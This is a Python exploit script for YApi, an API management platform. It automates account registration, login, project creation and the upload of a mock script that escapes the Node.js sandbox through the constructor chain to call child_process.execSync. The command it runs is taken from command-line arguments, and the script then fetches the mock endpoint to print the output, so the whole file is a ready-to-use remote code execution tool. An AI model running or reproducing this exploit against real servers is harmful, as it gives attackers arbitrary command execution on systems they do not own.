# This is a sample Python script.

# Press ⌃R to execute it or replace it with your code.
# Press Double ⇧ to search everywhere for classes, files, tool windows, actions, and settings.
import argparse
import getopt
import random
import sys
import time

import requests
import http.cookiejar as cookielib

def main(proto,server,port,cmd):

    # python3 requests 模拟登录状态的两种方式
    # https://blog.csdn.net/u010895119/article/details/80584842
    # python3下使用requests实现模拟用户登录 —— 基础篇（马蜂窝）
    # https://blog.csdn.net/zwq912318834/article/details/79571110
    # Python—requests模块详解
    # https://www.cnblogs.com/lanyinhao/p/9634742.html
    headers = {'Accept': 'application/json, text/plain, */*',
               'Accept-Encoding': 'gzip, deflate, compress',
               'Accept-Language': 'en-us;q=0.5,en;q=0.3',
               'Cache-Control': 'max-age=0',
               'Connection': 'keep-alive',
               'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:22.0) Gecko/20100101 Firefox/22.0'}
    session = requests.Session()
    #session.cookies = cookielib.LWPCookieJar(filename="yapiCookies.txt")
    session.headers.update(headers)
    host = f'{proto}://{server}:{port}'
    # POST /api/user/reg
    rid = random.randint(1, 1000)
    username = f"xxx{rid}"
    email = f"xxx{rid}@xxx.com"
    password = f"xxxXXX{rid}"
    print("username:", username, " password:", password, " email:", email)
    data = {"email":email,"password":password,"username":username}
    url = host + '/api/user/reg'
    respones = session.post(url, data=data)
    respones= respones.json()
    errcode = respones['errcode']
    errmsg = respones['errmsg']
    if errcode:
        print("[Error]", errmsg)
        exit(1)
    else:
        print("[user reg]", errmsg)

    # POST /api/user/login
    url = host + '/api/user/login'
    data = {"email": email, "password": password}
    respones = session.post(url, data=data)
    respones = respones.json()
    errcode = respones['errcode']  # 0
    errmsg = respones['errmsg']
    if errcode:
        print("[Error]", errmsg)
        exit(1)
    else:
        print("[login]",errmsg)
    #session.cookies.save()

    # login = requests.post(url, data=data)
    # _yapi_token = login.cookies['_yapi_token']
    # _yapi_uid = login.cookies['_yapi_uid']
    # print(_yapi_token)
    # print(_yapi_uid)
    # cookies = {'_yapi_token':_yapi_token,'_yapi_uid':_yapi_uid}

    url = host + '/api/group/list'
    respones = session.get(url)
    respones = respones.json()
    errcode = respones['errcode']  # 0
    errmsg = respones['errmsg']
    if errcode:
        print("[Error]", errmsg)
        exit(1)
    else:
        print("[group list]", errmsg)
    first_group = respones['data'][0]
    groud_id = first_group['_id']

    # POST /api/project/add
    # {"name":"project","group_id":"12","icon":"code-o","color":"pink","project_type":"private"}
    # session.cookies.load()
    url = host + '/api/project/add'
    project_name = f"project{rid}"
    print("new project:", project_name)
    data = {"name": project_name, "group_id": groud_id, "icon": "code-o", "color": "pink", "project_type": "private"}
    respones = session.post(url, data=data)
    respones = respones.json()
    errcode = respones['errcode']
    errmsg = respones['errmsg']
    if errcode:
        print("[Error]", errmsg)
        exit(1)
    else:
        print("[project add]", errmsg)
    project_id = respones['data']['_id']


    # POST /api/project/up
    # {"id":18,"project_mock_script":"const sandbox = this\r\nconst ObjectConstructor = this.constructor\r\nconst FunctionConstructor = ObjectConstructor.constructor\r\nconst myfun = FunctionConstructor('return process')\r\nconst process = myfun()\r\nmockJson = process.mainModule.require(\"child_process\").execSync(\"whoami && ps -ef\").toString()","is_mock_open":true}
    url = host + '/api/project/up'
    #cmd = "whoami && ps -ef"
    print("new mock:", cmd)
    data = {"id": project_id,
            "project_mock_script": f"const sandbox = this\r\nconst ObjectConstructor = this.constructor\r\nconst FunctionConstructor = ObjectConstructor.constructor\r\nconst myfun = FunctionConstructor('return process')\r\nconst process = myfun()\r\nmockJson = process.mainModule.require(\"child_process\").execSync(\"{cmd}\").toString()",
            "is_mock_open": 'true'}
    respones = session.post(url, data=data)
    respones = respones.json()
    errcode = respones['errcode']
    errmsg = respones['errmsg']
    if errcode:
        print("[Error]", errmsg)
        exit(1)
    else:
        print("[project up]", errmsg)
    # POST /api/interface/add
    # {"method":"GET","catid":"14","title":"test","path":"/test","project_id":18}
    url = host + '/api/interface/add'
    interface_name = "test"
    interface_path = "/test"
    data = {"method": "GET", "catid": "14", "title": interface_name, "path": interface_path, "project_id": project_id}
    print("new interface:",interface_name," path:",interface_path)
    respones = session.post(url, data=data)
    respones = respones.json()
    errcode = respones['errcode']
    errmsg = respones['errmsg']
    if errcode:
        print("[Error]", errmsg)
        exit(1)
    else:
        print("[interface add]", errmsg)
    interface_id = respones['data']['_id']

    # POST /api/interface/up
    # {"id":"18","status":"done"}
    url = host + '/api/interface/up'
    data = {"id": interface_id, "status": "done"}
    respones = session.post(url, data=data)
    respones = respones.json()
    errcode = respones['errcode']
    errmsg = respones['errmsg']
    if errcode:
        print("[Error]", errmsg)
        exit(1)
    else:
        print("[interface up]", errmsg)

    # GET /mock/18/test
    url = host + f"/mock/{project_id}/test"
    respones = session.get(url)
    print(respones.text)

# Press the green button in the gutter to run the script.
if __name__ == '__main__':
    #cmd = 'whoami && ps -ef'
    # https://www.cnblogs.com/stan-si/archive/2017/03/02/6484146.html
    parser = argparse.ArgumentParser(usage="it's usage tip.", description="help info.")
    parser.add_argument("-c", "--cmd", required=True, help="command to execute")
    parser.add_argument("-s", "--server", required=True, help="server to connect")
    parser.add_argument("-p", "--port", required=True, type=int, help="port to connect")
    parser.add_argument("-w", "--proto", required=True, help="http or https")
    args = parser.parse_args()
    proto = args.proto
    server = args.server
    port = args.port
    cmd = args.cmd
    main(proto, server, port, cmd)
